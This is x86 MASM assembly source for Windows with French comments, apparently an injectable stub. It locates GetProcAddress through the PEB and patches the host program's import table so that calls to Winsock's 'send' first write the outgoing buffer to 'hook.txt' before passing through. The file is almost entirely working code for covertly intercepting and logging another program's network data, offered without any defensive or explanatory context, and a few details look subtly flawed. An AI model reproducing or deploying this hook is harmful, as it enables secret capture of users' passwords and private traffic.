.386
.model flat, stdcall

include windows.inc
include kernel32.inc
include user32.inc
include Comctl32.inc
include shell32.inc

includelib kernel32.lib
includelib user32.lib
includelib Comctl32.lib
includelib shell32.lib

.code
assume fs:nothing

GetProc dd ?
WriteFi	dd ?
CreateFi dd ?
Base_DLL dd ?
Export_Table dd ?
Name_Table_Ptr dd ?
Count dd ?
IAT_API dd ?
API dd ?
Nom_Dll db "WS2_32.DLL"
Nom_Fonction db "send",0h,0h,0h,0h,0h,0h,0h
Nom_File db "hook.txt",0h
Nom_WriteFile db "WriteFile",0h
Nom_CreateFile db "CreateFileA",0h


FindGetProcAddress:
mov     edx , 30h
mov     edx,fs:[edx]	; Adresse de PEB (dans TEB)
mov     eax,[edx + 0ch]	; PEB_LBR_DATA
mov     esi,[eax + 1Ch]	; InitializationOrderModule
mov     eax,[esi]	; Liste chaînée
mov     edx,[eax + 8]	; Deuxieme element
mov     [Base_DLL], edx	; On le stocke dans la pile

mov     edx,[edx+3ch]	; Récupération du header de PE
add     edx,[Base_DLL]	; + Adresse de Base
mov     edx,[edx+78h]	; Récupération de l’adresse de “export table”
add     edx,[Base_DLL]	; + Base
mov     [Export_Table],edx	; Stockage dans la pile


xor     eax,eax
add     edx,20h	; Name table PTR
mov     edx,[edx]
add     edx,[Base_DLL]	; + Base
mov     [Name_Table_Ptr],edx

Search_Fct:
xor ecx, ecx
mov ebx, [Name_Table_Ptr]
mov ebx, [ebx]         	     	; Notre variable
add ebx, [Base_DLL]            	; +base
cmp  dword ptr [ebx], 'PteG' 
jne _return
cmp  dword ptr [ebx+4h], 'Acor' ; strcmp
jne _return
jmp Recup
_return:
add word ptr [Name_Table_Ptr], 4h ; Adress++
add word ptr [Count], 1h ; count++
jmp Search_Fct; on boucle


Recup:
mov ebx, [Count]		; Transformation des index en adresse
imul ebx, 4h			; relative
mov [Count], ebx      
mov ebx, [Export_Table]
add ebx, 1ch
mov ebx,[ebx]
add ebx ,[Base_DLL]
add ebx, [Count]
mov ebx, [ebx]
add ebx, [Base_DLL]
mov [GetProc],ebx
ret

Search_API:
push ebp
mov ebp,esp
mov eax,[ebp+08h]
push eax
push dword ptr [Base_DLL]
call dword ptr [GetProc]
mov esp,ebp
pop ebp
ret 4



start:
		call FindGetProcAddress
		push offset Nom_CreateFile
		call Search_API
		mov [CreateFi],eax
		push offset Nom_WriteFile
		call Search_API
		mov [WriteFi],eax
		xor eax,eax
		xor ebx,ebx
		xor ecx,ecx
		xor edx,edx
		mov eax, fs : [30h]
		mov ebx,[eax+08h]	
		
		mov eax,ebx		
		add eax, [ebx+3ch]	
		
		mov eax,[eax+80h]		
		add eax,ebx

Search_dll:		
		lea esi, Nom_Dll		
		mov edi, [eax+0ch]		
		and edi,edi			
		jz BYE		
		add edi, ebx		
		mov ecx,0ah	
		repz cmpsb
		and ecx,ecx
		jnz Next_dll
		mov cl,byte ptr [edi]
		and cl,cl
		jnz Next_dll
		jmp Good

Next_dll:
		add eax,14h		
		jmp Search_dll

Good:					
		xor edx,edx
		push eax

		mov eax,[eax]
		add eax,ebx

Search_Fct_2:
		mov edi,[eax]
		and edi,edi
		jz BYE	
		add edi,ebx
		add edi,02h
		lea esi,Nom_Fonction
		mov ecx,04h
		repz cmpsb
		and ecx,ecx
		jnz Next_Fct2
		mov cl,byte ptr [edi]
		and cl,cl
		jnz Next_Fct2
		jmp Good2

Next_Fct2:
		inc edx
		add eax,04h
		jmp Search_Fct_2

Good2:
		pop eax
		mov eax,[eax+10h]
		add eax,ebx
		imul edx,4
		add eax,edx
		
fin:
		mov IAT_API,eax
		mov ebx,[eax]
		mov API,ebx
		mov [eax],Hook
BYE:
		xor eax,eax
		mov eax,401000
		jmp eax
		
Hook:
	push ebp
	mov ebp,esp
	mov eax,[ebp+12]
	push 0
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_ALWAYS
	push 0
	push 0
	push GENERIC_WRITE
	push offset Nom_File
	call dword ptr [CreateFi]
	mov ebx,[ebp+12]
	push 0
	push offset Nom_File
	push 50
	push ebx
	push eax
	call dword ptr [WriteFi]
Jump:
	mov esp, ebp
	pop ebp
	jmp API
	
end start
